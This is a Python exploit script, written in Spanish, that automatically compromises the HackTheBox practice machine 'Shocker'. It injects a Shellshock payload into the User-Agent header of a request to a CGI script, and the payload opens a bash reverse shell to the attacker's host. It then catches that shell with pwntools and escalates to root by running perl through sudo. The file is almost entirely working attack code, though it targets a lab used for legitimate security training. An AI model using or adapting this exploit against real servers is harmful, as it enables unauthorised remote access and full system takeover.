#!/usr/bin/python3
#coding:utf-8

import signal, sys, time, argparse, requests, threading
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables
rhost = "10.10.10.56"
lport = "443"
lhost = ""

def makeRequest():
    p1 = log.progress("ShellShock")
    url = "http://{}/cgi-bin/user.sh".format(rhost)
    p1.status("Generando la solicitud a la máquina {}".format(rhost))
    time.sleep(2)
    headers = {
            'User-Agent' : '() { :; }; echo; /bin/bash -i >& /dev/tcp/%s/%s 0>&1 &' % (lhost, lport)
    }
    p1.status("Enviando la solicitud")
    time.sleep(2)
    r = requests.get(url,headers=headers)
    p1.success("Solicitud enviada")
    time.sleep(2)

if __name__ == '__main__':
    argparser = argparse.ArgumentParser(description='Autopwn de la máquina Shocker de la plataforma HTB')
    argparser.add_argument('--rhost', type=str,
            help='Remote host ip (default: 10.10.10.56)',
            default='10.10.10.56')
    argparser.add_argument('--lhost', type=str,
            help='Local host ip (Attacker)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (default: 443)',
            default='443')
    args = argparser.parse_args()

    rhost = args.rhost
    lport = args.lport
    lhost = args.lhost

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)
    p2 = log.progress("Conexión")
    p2.status("Esperando conexión")
    time.sleep(2)
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        p2.failure("Error - Conexión no recibida")
        time.sleep(2)
        sys.exit(1)
    else:
        p2.success("Conexión recibida exitosamente")
        time.sleep(2)
    p3 = log.progress("Escalada de privilegios")
    p3.status("Escalando privilegios")
    time.sleep(2)
    shell.sendline("sudo /usr/bin/perl -e 'exec \"/bin/bash\";'")
    p3.success("Escalada de privilegios exitosa")
    shell.interactive()
